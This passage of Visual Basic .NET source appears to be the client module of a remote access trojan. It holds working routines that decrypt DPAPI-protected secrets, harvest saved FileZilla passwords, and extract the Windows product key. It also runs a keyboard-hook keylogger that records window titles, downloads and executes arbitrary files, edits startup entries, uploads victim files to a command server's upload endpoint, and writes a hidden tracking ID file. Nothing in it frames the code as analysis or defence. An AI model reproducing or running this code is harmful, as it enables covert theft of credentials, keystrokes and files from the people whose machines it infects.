        Dim inj, Ors As New Win32.DATA_BLOB
        Dim Ghandle As Runtime.InteropServices.GCHandle = Runtime.InteropServices.GCHandle.Alloc(Datas, Runtime.InteropServices.GCHandleType.Pinned)
        inj.pbData = Ghandle.AddrOfPinnedObject()
        inj.cbData = Datas.Length
        Ghandle.Free()
        Win32.CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
        Dim Returned() As Byte = New Byte(Ors.cbData) {}
        Runtime.InteropServices.Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
        Dim TheString As String = System.Text.Encoding.Default.GetString(Returned)
        Return TheString.Substring(0, TheString.Length - 1)
    End Function

    Public Function RotateRight(ByVal [string] As [String]) As [String]
        Dim [retstr] As [String] = [string].Empty
        For i As [Int32] = 0 To [string].Length - 1 Step 1
            [retstr] += Chr(Asc([string].Chars(i)) + 5)
        Next
        Return [retstr]
    End Function

    Public Function RotateLeft(ByVal Str As String) As String
        Dim Output As String = String.Empty
        For I As Int32 = 0 To Str.Length - 1
            Output &= Chr(Asc(Str.Chars(I)) - 5)
        Next
        Return Output
    End Function

#End Region

#Region "FileZilla"

    Public Function Passwords_FileZilla() As String
        Dim Passwords As String = String.Empty
        Dim pth As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\" & "sitemanager.xml"
        Dim pathstringg As String = String.Empty
        If IO.File.Exists(pth) Then
            Dim Servers() As String
            Servers = Split(IO.File.ReadAllText(pth), "<Server>")
            For Each s3dtdJWS In Servers
                Dim u5Tuefhh As String = Nothing
                Dim pwd As String = Nothing
                Dim trop As String = Nothing
                Dim resu As String = Nothing
                Dim ha9Jgsrq = s3dtdJWS.Split(CChar(vbNewLine))
                For Each UAS4JU5v As String In ha9Jgsrq
                    If UAS4JU5v.Contains("<Host>") Then
                        u5Tuefhh = Split(Split(UAS4JU5v, "<Host>")(1), "</Host>")(0)
                    End If
                    If UAS4JU5v.Contains("<Port>") Then
                        trop = Split(Split(UAS4JU5v, "<Port>")(1), "</Port>")(0)
                    End If
                    If UAS4JU5v.Contains("<User>") Then
                        resu = Split(Split(UAS4JU5v, "<User>")(1), "</User>")(0)
                    End If
                    If UAS4JU5v.Contains("<Pass>") Then
                        pwd = Split(Split(UAS4JU5v, "<Pass>")(1), "</Pass>")(0)
                    End If
                Next
                Dim tmp As String = "FileZilla|||" & resu & "|||" & pwd & "|||" & u5Tuefhh & "||||"
                If u5Tuefhh <> "" And Not Passwords.Contains(tmp) Then
                    Passwords += tmp
                End If
            Next
        End If
        Return Passwords

    End Function

#End Region

#Region "Windows Key"
    Public ReadOnly Property WinKey() As String
        Get
            Try
                Dim rKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                Dim rpk As Byte() = CType(rKey.GetValue("DigitalProductId", 0), Byte())
                Dim strKey As String = ""
                Const iRPKOffset As Integer = 52
                Const strPossibleChars As String = "BCDFGHJKMPQRTVWXY2346789"
                Dim i As Integer = 28
                Do
                    Dim lAccu As Long = 0
                    Dim j As Integer = 14
                    Do
                        lAccu *= 256
                        lAccu += Convert.ToInt64(rpk(iRPKOffset + j))
                        rpk(iRPKOffset + j) = Convert.ToByte(Convert.ToInt64(Math.Floor(CSng(lAccu) / 24.0F)) And Convert.ToInt64(255))
                        lAccu = lAccu Mod 24
                        j -= 1
                    Loop While j >= 0
                    i -= 1
                    strKey = strPossibleChars(CInt(lAccu)).ToString() + strKey
                    If (0 = ((29 - i) Mod 6)) AndAlso (-1 <> i) Then
                        i -= 1
                        strKey = "-" + strKey
                    End If
                Loop While i >= 0
                Return "Windowskey|||Null|||" & strKey & "|||Null"
            Catch ex As Exception
                Return "Windowskey|||Null|||Not found|||Null"
            End Try
        End Get
    End Property

#End Region

#End Region

#Region "Command - Keylogger"

    Private Sub StartKeylogger()
        Dim thread As New Thread(Sub()
                                     _hook = New KeyLogger()
                                     AddHandler _hook.KeyDown, AddressOf hook_KeyDown
                                     AddHandler _hook.KeyUp, AddressOf hook_KeyUp
                                     Application.Run()
                                 End Sub)
        thread.Start()

    End Sub

    Private Sub hook_KeyDown(sender As Object, e As KeyLoggerEventArgs)

        If _currentWindow <> _hook.CurrentWindow Then
            _currentWindow = _hook.CurrentWindow
            Log(String.Format(vbNewLine & "[ -- {0} -- ]" & vbNewLine, _hook.CurrentWindow))
        End If

        Log(String.Format("{0}", e.StringValue))

    End Sub

    Private Sub hook_KeyUp(sender As Object, e As KeyLoggerEventArgs)
        Log(String.Format("{0}", e.StringValue))
    End Sub

    Private Sub Log(ByVal text As String)
        keylogs.Append(text)
    End Sub

    Private Function GetKeylogs() As String
        Return keylogs.ToString
    End Function

#End Region

#Region "Command - Downloadmanager"

    Private Function GetDownlaodLocation(ByVal Number As String) As String
        Select Case Number
            Case "0"
                Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString
            Case "1"
                Return Path.GetTempPath.ToString
            Case "2"
                Return Environment.GetFolderPath(Environment.SpecialFolder.Desktop).ToString
            Case Else
                Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString
        End Select
    End Function

    Private Sub DownloadAndExecute(ByVal downloadlink As String, ByVal DownloadDir As String)
        Dim extension As String = downloadlink.Substring(downloadlink.LastIndexOf("."))
        Dim rnd As New System.Random
        Dim Randomfilename As String = rnd.Next(10000, 99999).ToString & extension
        Dim Randomfilepath As String = GetDownlaodLocation(DownloadDir) & "\" & Randomfilename
        Dim DownlaodThread As New Thread(Sub()
                                             Try
                                                 Dim wc As New System.Net.WebClient
                                                 Dim data As Byte() = wc.DownloadData(downloadlink)
                                                 File.WriteAllBytes(Randomfilepath, data)
                                                 If File.Exists(Randomfilepath) Then
                                                     Process.Start(Randomfilepath)
                                                 End If
                                             Catch ex As Exception
                                                 DebugToConsole("Download from url failed. Reason: " & ex.Message, DebugStatus.Failed)
                                                 WriteResponse("65x1")
                                             End Try
                                         End Sub)
        DownlaodThread.Start()
    End Sub


#End Region

#Region "Command - Startup Monitor"

    Private Sub RemoveStartupProgram(ByVal Parameters As String)
        Try
            Dim Params() As String = Split(Parameters, "|||")
            If Params(0) = "True" Then
                Console.WriteLine("Is Regkey: True")
                Console.WriteLine("Param 1 : " & Params(1))
                Console.WriteLine("Param 1 : " & Params(2))
                Try
                    If (Params(1) = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run") OrElse (Params(1) = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce") OrElse (Params(1) = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run") OrElse (Params(1) = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce") Then
                        DebugToConsole("Deleting startupitem " & Params(2), DebugStatus.Pending)
                        DeleteReyKeyValue(Params(1), Params(2))
                    End If
                    WriteResponse("67")
                Catch ex As Exception
                    DebugToConsole(ex.Message, DebugStatus.Failed)
                    WriteResponse("67x1")
                End Try
            Else
                Try
                    If Params(1) = "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" Then
                        If Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup") Then
                            'Console.WriteLine("dir is da.")
                            'MsgBox(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup" & "\" & Params(2))
                            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup" & "\" & Params(2)) Then
                                '  Console.WriteLine("file is da.")
                                Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup")
                                Try
                                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup" & "\" & Params(2))
                                    WriteResponse("67")
                                Catch
                                    DebugToConsole("Unable to remove startup item.", DebugStatus.Failed)
                                End Try
                            End If
                        End If
                    ElseIf Params(1) = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" Then
                        If Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup") Then
                            Console.WriteLine("dir is da.")
                            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup" & "\" & Params(2)) Then
                                Console.WriteLine("file is da.")
                                Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup")
                                Try
                                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup" & "\" & Params(2))
                                    WriteResponse("67")
                                Catch
                                    DebugToConsole("Unable to remove startup item.", DebugStatus.Failed)
                                End Try
                            End If
                        End If
                    End If

                Catch ex As Exception
                    DebugToConsole(ex.Message, DebugStatus.Failed)
                    WriteResponse("67x1")
                End Try
            End If
        Catch ex As Exception
            DebugToConsole(ex.Message, DebugStatus.Failed)
        End Try
    End Sub

    Public Function GetStartupPrograms() As String
        Dim output As String = String.Empty


        Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", False)
            For Each k As String In key.GetValueNames
                output &= "1" & "|||" & k.ToString & "|||" & key.GetValue(k).ToString & "~~~"
            Next
        End Using
        Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", False)
            For Each k In key.GetValueNames
                output &= "2" & "|||" & k.ToString & "|||" & key.GetValue(k).ToString & "~~~"
            Next
        End Using
        Using key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", False)
            For Each k In key.GetValueNames
                output &= "3" & "|||" & k.ToString & "|||" & key.GetValue(k).ToString & "~~~"
            Next
        End Using
        Using key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", False)
            For Each k In key.GetValueNames
                output &= "4" & "|||" & k.ToString & "|||" & key.GetValue(k).ToString & "~~~"
            Next
        End Using
        If Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup") Then
            For Each file As FileInfo In New DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup").GetFiles()
                output &= "5" & "|||" & file.Name & "|||" & file.FullName & "~~~"
            Next
        End If
        If Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup") Then
            For Each file As FileInfo In New DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Start Menu\Programs\Startup").GetFiles()
                output &= "6" & "|||" & file.Name & "|||" & file.FullName & "~~~"
            Next
        End If
        Return output
    End Function

#End Region

#Region "Command - Microphone"

    Private Sub RecordMicrophone(ByVal Duration As Integer)

    End Sub

#End Region

    ' --- Download files ----

#Region "Command - DownloadFile"


    Private Sub StartUpload(ByVal FilePath As String)
        If Not File.Exists(FilePath) Then
            WriteResponse("68x2") 'File not found
        Else
            Try
                AddHandler client.UploadProgressChanged, AddressOf UploadProgressCallback
                AddHandler client.UploadFileCompleted, AddressOf UploadCompletedCallback
                client.UploadFileAsync(New Uri(HostAdress & "/main.php?cmd=upload"), FilePath)
            Catch ex As Exception
                Console.WriteLine(ex.Message)
                WriteResponse("68x1")
                Exit Sub
            End Try
        End If
    End Sub
    Private Sub UploadCompletedCallback(ByVal sender As Object, ByVal e As UploadFileCompletedEventArgs)
        Try
            Console.WriteLine("Download completed : " & Encoding.UTF8.GetString(e.Result))
            WriteData(Encoding.UTF8.GetString(e.Result))
            WriteResponse("68")
        Catch ex As Exception
            Console.WriteLine(ex.Message)
            WriteResponse("68x1")
        End Try
    End Sub

    Private Sub UploadProgressCallback(ByVal sender As Object, ByVal e As UploadProgressChangedEventArgs)
        Try
            Console.WriteLine(CalculatePercent(CInt(e.BytesSent), CInt(e.TotalBytesToSend)) & "% have been uploaded.")
        Catch ex As Exception
            Console.WriteLine(ex.Message)
            WriteResponse("68x1")
        End Try
    End Sub

    Private Function CalculatePercent(ByVal SentAlready As Integer, ByVal ToSend As Integer) As Integer
        Return CInt(SentAlready / (ToSend / 100))
    End Function

#End Region

#Region "Identification Number"

    Public Function changeFileAttributes(ByVal FilePath As String, ByVal Attributes As System.IO.FileAttributes) As Boolean
        Try
            Dim dInfo As New System.IO.DirectoryInfo(FilePath)
            Dim u11 As System.IO.FileAttributes = dInfo.Attributes
            u11 = Attributes
            dInfo.Attributes = u11
            Return True
        Catch
            Return False
        End Try
    End Function


    Public Function GenerateUnqiueID() As String
        Dim Filepath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\settings.dat"
        Dim ID As String = String.Empty
        If Not File.Exists(Filepath) Then
            File.WriteAllText(Filepath, System.Guid.NewGuid().ToString)
            changeFileAttributes(Filepath, FileAttributes.System Or FileAttributes.Hidden)
            ID = File.ReadAllText(Filepath)
        Else
            ID = File.ReadAllText(Filepath)
        End If

        Return ID
    End Function
#End Region

#Region "Debugmode"

    Public Enum DebugStatus
        Success = 1
        Pending = 2
        Failed = 3
    End Enum

    Public Sub DebugToConsole(ByVal Message As String, ConsoleStatusOk As DebugStatus)
        If ConsoleStatusOk = 1 Then
            Console.ForegroundColor = ConsoleColor.Green
            Console.Write("[+]")
            Console.ForegroundColor = ConsoleColor.Gray
            Console.WriteLine(" - " & Message)
        ElseIf ConsoleStatusOk = 2 Then
            Console.ForegroundColor = ConsoleColor.Cyan
            Console.Write("[*]")
            Console.ForegroundColor = ConsoleColor.Gray
            Console.WriteLine(" - " & Message)
        ElseIf ConsoleStatusOk = 3 Then
            Console.ForegroundColor = ConsoleColor.Red
            Console.Write("[-]")
            Console.ForegroundColor = ConsoleColor.Gray
            Console.WriteLine(" - " & Message)
        End If
    End Sub

    Public Function Application_ConsoleEvent(ByVal [event] As Win32.ConsoleEvent) As Boolean
        Dim cancel As Boolean = False
        Select Case [event]
            Case Win32.ConsoleEvent.CTRL_BREAK_EVENT
                DebugToConsole("Disconnecting. Reason: Console Break Event.", DebugStatus.Success)
                Disconnect()
            Case Win32.ConsoleEvent.CTRL_CLOSE_EVENT
                Try
                    DebugToConsole("Disconnecting. Reason: Console Close.", DebugStatus.Success)
                    Disconnect()
                Catch ex As AccessViolationException
                    DebugToConsole("Unable to remove user, AccessViolationException occured.", DebugStatus.Success)
                End Try
            Case Win32.ConsoleEvent.CTRL_LOGOFF_EVENT
                DebugToConsole("Disconnecting. Reason: Logoff.", DebugStatus.Success)
                Disconnect()
            Case Win32.ConsoleEvent.CTRL_SHUTDOWN_EVENT
                DebugToConsole("Disconnecting. Reason: System shutdown.", DebugStatus.Success)
                Disconnect()
        End Select
        Return cancel
    End Function

#End Region

End Module
